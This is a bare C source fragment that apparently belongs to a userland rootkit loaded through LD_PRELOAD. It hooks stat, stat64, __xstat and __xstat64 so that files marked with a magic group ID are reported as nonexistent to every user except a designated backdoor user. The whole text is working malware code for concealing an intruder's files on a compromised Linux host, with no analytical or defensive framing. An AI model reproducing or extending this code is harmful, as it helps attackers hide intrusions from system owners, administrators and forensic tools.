int stat(const char *pathname, struct stat *buf)
{
    HOOK(o_stat,CSTAT);
    if(is_bdusr()) return o_stat(pathname,buf);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_stat(pathname,buf);
}

int stat64(const char *pathname, struct stat64 *buf)
{
    HOOK(o_stat64,CSTAT64);
    if(is_bdusr()) return o_stat64(pathname,buf);
    if(hxstat(pathname,MGID,64)) { errno=ENOENT; return -1; }
    return o_stat64(pathname,buf);
}

int __xstat(int version, const char *pathname, struct stat *buf)
{
    HOOK(o_xstat,C__XSTAT);
    if(is_bdusr()) return o_xstat(version,pathname,buf);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_xstat(version,pathname,buf);
}

int __xstat64(int version, const char *pathname, struct stat64 *buf)
{
    HOOK(o_xstat64,C__XSTAT64);
    if(is_bdusr()) return o_xstat64(version,pathname,buf);
    if(hxstat(pathname,MGID,64)) { errno=ENOENT; return -1; }
    return o_xstat64(version,pathname,buf);
}
